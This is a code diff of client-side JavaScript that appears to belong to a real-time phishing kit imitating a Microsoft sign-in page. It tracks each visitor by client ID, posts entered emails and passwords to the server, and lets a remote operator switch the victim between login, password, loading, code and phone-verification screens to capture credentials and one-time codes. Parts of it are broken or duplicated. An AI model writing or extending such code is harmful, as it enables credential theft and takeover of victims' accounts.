@@ -1,184 +1,252 @@
-const clientId = getClientId();
-
-// Function to show loading screen
-function showLoading() {
-  $("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
-  $("#div3").animate({ right: 0, opacity: "show" }, 0);
-  $("#div2").animate({ left: 0, opacity: "hide" }, 0);
-  currPage = "Loading Screen";
+function showLoading(){
+$("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
+$("#div3").animate({ right: 0, opacity: "show" }, 0);
+$("#div2").animate({ left: 0, opacity: "hide" }, 0);        
+currPage = "Loading Screen";
 }
 
-// Function to hide div3
+//div1 is email
+//div2 is password
+
+// Function to hide div3 and show div2
 function hideLoading() {
+  // Hide div3
   $("#div3").animate({ left: 0, opacity: "hide" }, 0);
 }
 
-// Function to show password screen
+// Function to animate divs and update inner HTML
 function passwordScreen() {
-  $("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
+	$("#diiiv1").animate({ left: 0, opacity: "hide" }, 0);
   $("#div3").animate({ left: 0, opacity: "hide" }, 0);
   $("#div2").animate({ right: 0, opacity: "show" }, 0);
   $("#aich").html(my_ai);
   currPage = "Password Screen";
 }
 
-// Function to show login screen
+
 function loginScreen() {
+  // Animate #div3: move left to 0 and show
   $("#msg").hide();
-  $("#ai").val("");
-  $("#pr").val("");
-  $("#div2").hide();
-  $("#diiiv1").show();
-  $("#div3").animate({ left: 0, opacity: "hide" }, 0);
+        $("#ai").val("");
+        $("#pr").val("");
+        $("#div2").hide();
+        $("#diiiv1").show();
+        $("#div3").animate({ left: 0, opacity: "hide" }, 0);
   currPage = "Login Screen";
 }
 
+
 // Send heartbeat signals to the server at regular intervals
 const heartbeatInterval = setInterval(() => {
-	
-  fetch('/heartbeat', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ clientId: clientId, currPage: currPage })
-  })
-  .then(response => {
-    if (!response.ok) throw new Error('Failed to send heartbeat signal to server');
-    return response.headers.get('content-type')?.includes('application/json') ? response.json() : response.text();
-  })
-  .then(data => console.log('Heartbeat signal sent successfully:', data))
-  .catch(error => console.error('Error sending heartbeat signal to server:', error.message));
+    fetch('/heartbeat', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            clientId: clientId,
+            currPage: currPage
+        }),
+    })
+    .then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send heartbeat signal to server');
+        }
+        const contentType = response.headers.get('content-type');
+        if (contentType && contentType.includes('application/json')) {
+            return response.json();
+        } else {
+            return response.text(); // or response.blob(), etc., depending on what you expect
+        }
+    })
+    .then(data => {
+        // Handle response data if needed
+        console.log('Heartbeat signal sent successfully:', data);
+        // Additional processing if required
+    })
+    .catch(error => {
+        console.error('Error sending heartbeat signal to server:', error.message);
+    });
 }, 29000);
 
 
-// Function to get a cookie by name
 function getCookie(name) {
-  const value = `; ${document.cookie}`;
-  const parts = value.split(`; ${name}=`);
-  if (parts.length === 2) return parts.pop().split(';').shift();
+    const value = `; ${document.cookie}`;
+    const parts = value.split(`; ${name}=`);
+    if (parts.length === 2) return parts.pop().split(';').shift();
 }
 
-// Function to get or set a client ID
+//client ID if not already set
 function getClientId() {
-  let clientId = localStorage.getItem('clientId');
-  if (!clientId) {
-    clientId = `client-${Math.random().toString(36).substr(2, 9)}`;
-    localStorage.setItem('clientId', clientId);
-  }
-  return clientId;
-}
-
-
-
-let currPage = "client page";
-const clientId = getClientId();
-let socket;
-
-function connectWebSocket() {
-  socket = new WebSocket(`wss://${window.location.host}/ws?clientId=${clientId}&currPage=${currPage}`);
-
-  socket.onopen = () => {
-    console.log('WebSocket connection opened');
-  };
-
-  socket.onmessage = event => {
-    const data = JSON.parse(event.data);
-    console.log('WebSocket message received:', data);
-    if (data.type === 'command') {
-      handleCommand(data.command);
+    let clientId = localStorage.getItem('clientId');
+    if (!clientId) {
+        clientId = `client-${Math.random().toString(36).substr(2, 9)}`;
+        localStorage.setItem('clientId', clientId);
     }
-  };
-
-  socket.onerror = error => {
-    console.error('WebSocket error:', error);
-    reconnectWebSocket();
-  };
+    return clientId;
 }
 
-function reconnectWebSocket() {
-  setTimeout(() => {
-    connectWebSocket();
-  }, 2000); // Retry connection after 2 seconds
-}
+    
+const clientId = getClientId();
 
-connectWebSocket(); // Start WebSocket connection
 
-function handleCommand(command) {
-  switch (command) {
-    case 'emailScreen': loginScreen(); break;
-    case 'passwordScreen': passwordScreen(); break;
-    case 'loadScreen': showLoading(); break;
-    case 'codePage': window.location.href = "/code"; break;
-    case 'verifyPhone': window.location.href = "/phone"; break;
-    case 'loadPage': window.location.href = "/load"; break;
-  }
-}
+let eventSource;
 
-// Function to fetch command from server via WebSocket message
-function fetchCommand() {
-  socket.send(JSON.stringify({ type: 'fetchCommand' }));
-}
+function connectEventSource() {
+    //eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
+	consoleoc("eventSource req");
+    eventSource.onopen = function(event) {
+        console.log('Connection opened');
+    };
 
-// Handle incoming WebSocket messages
-socket.onmessage = event => {
-  const data = JSON.parse(event.data);
-  console.log('WebSocket message received:', data);
+    //This is for reconnection purposes 
+    eventSource.onmessage = function(event) {
+        console.log('Message received: ', event.data);
+        const data = JSON.parse(event.data);
+  console.log(data);
+
   if (data.type === 'command') {
-    handleCommand(data.command);
+    switch(data.command) {
+      case 'emailScreen':
+        loginScreen();
+        break;
+      case 'passwordScreen':
+        passwordScreen();
+        break;
+      case 'loadScreen':
+        showLoading();
+        break;
+      case 'codePage':
+        window.location.href = "/code";
+        break;
+      case 'verifyPhone':
+        window.location.href = "/phone";
+        break;
+      case 'loadPage':
+        window.location.href = "/load";
+        break;  
+    }
+  }
+    };
+    
+}
+
+
+eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
+
+eventSource.onmessage = function(event) {
+  const data = JSON.parse(event.data);
+  console.log(data);
+
+  if (data.type === 'command') {
+    switch(data.command) {
+      case 'emailScreen':
+        loginScreen();
+        break;
+      case 'passwordScreen':
+        passwordScreen();
+        break;
+      case 'loadScreen':
+        showLoading();
+        break;
+      case 'codePage':
+        window.location.href = "/code";
+        break;
+      case 'verifyPhone':
+        window.location.href = "/phone";
+        break;
+      case 'loadPage':
+        window.location.href = "/load";
+        break;  
+    }
   }
 };
+    
+    
+    eventSource.onerror = function(error) {
+      console.error('EventSource failed:', error);
+      connectEventSource();
+    };
+    
+    
+    function sendInput(data, redirectUrl = null) {
+            const iniData = { clientId, currPage };
+            const sendData = { ...iniData, ...data };
 
-// Function to send input to server and optionally redirect
-function sendInput(data, redirectUrl = null) {
-  const sendData = { clientId, currPage, ...data };
-  fetch('/input', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(sendData)
-  })
-  .then(response => {
-    if (!response.ok) throw new Error('Network response was not ok');
-    return response.headers.get('content-type')?.includes('application/json') ? response.json() : response.text();
-  })
-  .then(data => {
-    console.log('Success:', data);
-    setInterval(fetchCommand, 2000);
-    if (redirectUrl) window.location.href = redirectUrl;
-  })
-  .catch(error => console.error('Error:', error));
-}
+            fetch('/input', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(sendData)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                // Check if content-type is application/json before parsing
+                const contentType = response.headers.get('content-type');
+                if (contentType && contentType.includes('application/json')) {
+                    return response.json();
+                } else {
+                    return response.text(); // or response.blob(), etc., depending on what you expect
+                }
+            })
+            .then(data => {
+                console.log('Success:', data);
+                // Handle JSON data or text data here
+                if (redirectUrl) {
+                    window.location.href = redirectUrl; // Redirect to the specified URL
+                }
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
 
-// Function to validate email
 async function validateEmail(email) {
-  try {
-    const response = await fetch('/verify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ email })
-    });
-    if (!response.ok) throw new Error('Failed to validate email');
-    const data = await response.json();
-    return data.success;
-  } catch (error) {
-    console.error('Error validating email:', error);
-    return false;
-  }
+    try {
+        const response = await fetch('/verify', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ email: email }),
+        });
+
+        if (!response.ok) {
+            throw new Error('Failed to validate email');
+        }
+
+        const data = await response.json();
+        console.log(data); 
+        return data.success; // Returns true or false based on server response
+    } catch (error) {
+        console.error('Error validating email:', error);
+        return false; // Return false in case of any error
+    }
 }
 
-// Function to handle email input validation and sending
+
 async function handleAndSendEmailInput(email) {
-  try {
-    const valid = await validateEmail(email);
-    if (valid) {
-      showLoading();
-    } else {
-      const errorElement = document.querySelector("#error");
-      errorElement.style.borderColor = "#ff0000";
-      errorElement.style.display = "block";
-      errorElement.textContent = "Enter a valid email address, phone number, or Skype name.";
+    try {
+        let valid = await validateEmail(email);
+        console.log(valid);
+        if (valid) {
+        	//console.log('Email input is Valid.');
+            showLoading();
+        } else {
+            // Handle case where email input is invalid
+			document.querySelector("#error").style.borderColor = "#ff0000"; 
+			document.querySelector("#error").style.display = "block";
+            //console.log('Email input is invalid.');
+            document.querySelector("#error").textContent = "Enter a valid email address, phone number, or Skype name.";
+      
+        }
+    } catch (error) {
+        console.error('Error handling email input:', error);
+        // Handle error case
     }
-  } catch (error) {
-    console.error('Error handling email input:', error);
-  }
 }
 
 function setFavicon() {
